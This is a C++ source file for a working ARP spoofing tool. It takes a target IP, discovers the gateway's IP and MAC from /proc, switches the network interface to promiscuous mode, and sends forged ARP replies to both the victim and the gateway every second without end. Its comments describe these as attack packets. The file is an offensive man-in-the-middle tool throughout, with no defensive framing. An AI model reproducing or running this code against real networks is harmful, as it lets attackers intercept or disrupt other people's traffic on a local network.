/*
 * =====================================================================================
 *
 *       Filename  arp.cpp
 *
 *    Description  
 *
 *        Version  1.0
 *        Created  2015年04月12日 14时58分10秒
 *       Revision  none
 *       Compiler  gcc
 *
 *         Author  uniqxh, 
 *   Organization  
 *
 * =====================================================================================
 */

#include<pthread.h>
#include<stdio.h>
#include<sys/types.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<linux/if_ether.h>
#include<arpa/inet.h>
#include "arp.h"
#include<string.h>
#include<stdlib.h>
#include<errno.h>
#include<linux/if_arp.h>
#include<sys/ioctl.h>
int sock;	
struct sockaddr_ll sa;
struct ifreq req;
uint8_t myMac[6]      = {0};
uint8_t attackMac[6]  = {0};
uint8_t gatewayMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
uint8_t mac[6]        = {0};
uint8_t attackIp[4]   = {0};
uint8_t myIp[4]       = {0};
uint8_t gatewayIp[4]  = {0};
uint8_t netIfName[16] = "eth0";
void displayIp(uint8_t *s)
{
	printf("%d.%d.%d.%d\n", s[0], s[1], s[2], s[3]);
}
void displayMac(uint8_t *s)
{
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n", s[0], s[1], s[2], s[3], s[4], s[5]);
}
int init(int argc, char* argv[])
{
	int opt;
	bool flag = false;
	while((opt = getopt(argc, argv, "i:t:")) != -1)
	{
		switch(opt)
		{
			case 'i':
			{
				int ilen = strlen(optarg);
				memcpy(netIfName, optarg, sizeof(char)*ilen);
			}
				break;
			case 't':
			{
				uint32_t tip = inet_addr(optarg);
				if(tip != -1)
				{
					flag = true;
					memcpy(attackIp, &tip, sizeof(int));
				}
				else
				{
					perror("target ip");
					exit(1);
				}
			}
				break;
			default:
				perror("opt");
				break;
		}
	}
	if(flag == false) exit(-1);
	return 0;
}
void sendchy()
{
	ARPPACKET arp, garp;
	//构造攻击者到被攻击者的ARP应答包
	arp.ethhdr.type = htons(ETH_P_ARP);
	arp.arphdr.ht =  htons(ARPHRD_ETHER);
	arp.arphdr.pt =  htons(ETH_P_IP);
    memcpy(arp.ethhdr.dst, attackMac, 6);
    memcpy(arp.ethhdr.src, myMac, 6);
	arp.arphdr.ht = htons(1);
	arp.arphdr.pt = htons(2048);
	arp.arphdr.hl = 6;
	arp.arphdr.pl = 4;
	arp.arphdr.op = htons(ARPOP_REPLY);
	memcpy(arp.arphdr.s_eth, myMac, 6);
	memcpy(arp.arphdr.t_eth, attackMac, 6);
	memcpy(arp.arphdr.s_ip, gatewayIp, 4);
	memcpy(arp.arphdr.t_ip, attackIp, 4);
	memcpy(&garp, &arp, sizeof(arp));
	//构造攻击者到网关的ARP应答包
	memcpy(garp.ethhdr.dst, mac, 6);
	memcpy(garp.arphdr.t_eth, mac, 6);
	memcpy(garp.arphdr.s_ip, attackIp, 4);
	memcpy(garp.arphdr.t_ip, gatewayIp, 4);
	int i = 0;
	while(1)
	{
		printf("第 %d 次发送应答包 --> ", ++i);
		displayIp(attackIp);
		sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa));
		sendto(sock, &garp, sizeof(garp), 0, (struct sockaddr*)&sa, sizeof(sa));
		sleep(1);
	}
}
void getLocalIp()
{
	if(ioctl(sock, SIOCGIFADDR, &req) != 0)
	{
		perror("Get local IP address");
		exit(1);
	}
	in_addr ip;
	ip = ((struct sockaddr_in *)&req.ifr_addr)->sin_addr;
	memcpy(myIp, &ip, sizeof(in_addr));
	printf("Local IP Address: ");
	displayIp(myIp);
}
void getLocalMac()
{
	if(ioctl(sock, SIOCGIFHWADDR, &req) != 0)
	{
		perror("Get local Mac address");
		exit(1);
	}
	memcpy(myMac, req.ifr_hwaddr.sa_data, 6);
	printf("Local Mac Address: ");
	displayMac(myMac);
}
int ctoi(char c)
{
	if(c >= 'A' && c <= 'Z') return c - 'A' + 10;
	if(c >= 'a' && c <= 'z') return c - 'a' + 10;
	return c - '0';
}
void getGatewayMac()
{
	FILE *p = fopen("/proc/net/arp", "r");
	if(p == NULL)
	{
		perror("Open arp file");
		exit(1);
	}
	char Title[100];
	fgets(Title, 100, p);
	char ip[16], HW[8], Flags[8], Mac[18], Mask[5], Dev[16], g_ip[16], a_ip[16];
	sprintf(g_ip, "%d.%d.%d.%d", gatewayIp[0], gatewayIp[1], gatewayIp[2], gatewayIp[3]);
	sprintf(a_ip, "%d.%d.%d.%d", attackIp[0], attackIp[1], attackIp[2], attackIp[3]);
	bool gf=false, af=false;
	while(!feof(p))
	{
		fscanf(p, "%s %s %s %s %s %s", ip, HW, Flags, Mac, Mask, Dev);
		if(strcmp(ip, g_ip) == 0 && strcmp(Flags, "0x2") == 0)
		{
			gf = true;
			for(int i = 0; i < 6; ++ i)
			{
				mac[i] = ctoi(*(Mac + 3*i))*16 + ctoi(*(Mac + 3*i +1));
			}
		}
		else if(strcmp(ip, a_ip) == 0 && strcmp(Flags, "0x2") == 0)
		{
			af = true;
			for(int i = 0; i < 6; ++ i)
			{
				attackMac[i] = ctoi(*(Mac + 3*i))*16 + ctoi(*(Mac + 3*i +1));
			}
		}
		if(gf && af) break;
	}
	fclose(p);
	printf("Gateway Mac Address: ");
	displayMac(mac);
	printf("Attack Mac Address: ");
	displayMac(attackMac);
}
void getGatewayIp()
{
	FILE *p = fopen("/proc/net/route", "r");
	if(p == NULL)
	{
		perror("Open file");
		exit(1);
	}
	char Title[100];
	fgets(Title, 100, p);
	char iface[5];
	char Dst[8];
	char Gateway[9], ip[9], gip[16];
	char Flags[4];
	char RefCnt[5];
	char Use[5];
	char Metric[5];
	char Mask[10];
	char MTU[5];
	char RTT[5];
	memset(ip, '0', sizeof(ip));
	while(!feof(p))
	{
		fscanf(p, "%s %s %s %s %s %s %s %s %s %s", iface, Dst, Gateway, Flags, RefCnt, Use, Metric, Mask, MTU, RTT);
		if(strcmp(Gateway, ip) != 0)
		{
			//printf("%s\n", Gateway);
			break;
		}
	}
	fclose(p);
	for(int i = 0; i < 4; ++ i)
	{
		gatewayIp[3-i] = ctoi(*(Gateway + 2*i))*16 + ctoi(*(Gateway + 2*i +1));
	}
	printf("Gateway IP Address: ");
	displayIp(gatewayIp);
	getGatewayMac();
}
int main(int argc, char* argv[])
{
	if(init(argc, argv) != 0)
	{
		perror("target error");
		exit(-1);
	}
	if((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
	{
		perror("socket");
		exit(1);
	}
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = AF_PACKET;
	strcpy(req.ifr_name, (char*)netIfName);
	if(ioctl(sock, SIOCGIFINDEX, &req) != 0)
	{
		perror("ioctl");
		close(sock);
		exit(1);
	}
	sa.sll_ifindex = req.ifr_ifindex;
	sa.sll_protocol = htons(ETH_P_ARP);
	getLocalIp();
	getLocalMac();
	getGatewayIp();
	if(ioctl(sock, SIOCGIFFLAGS, &req) != 0)
	{
		perror("ioctl");
		exit(-1);
	}
	req.ifr_flags |= IFF_PROMISC;
	if(ioctl(sock, SIOCSIFFLAGS, &req) != 0)
	{
		perror("ioctl");
		close(sock);
		exit(1);
	}
	sendchy();
	close(sock);
	return 1;
}
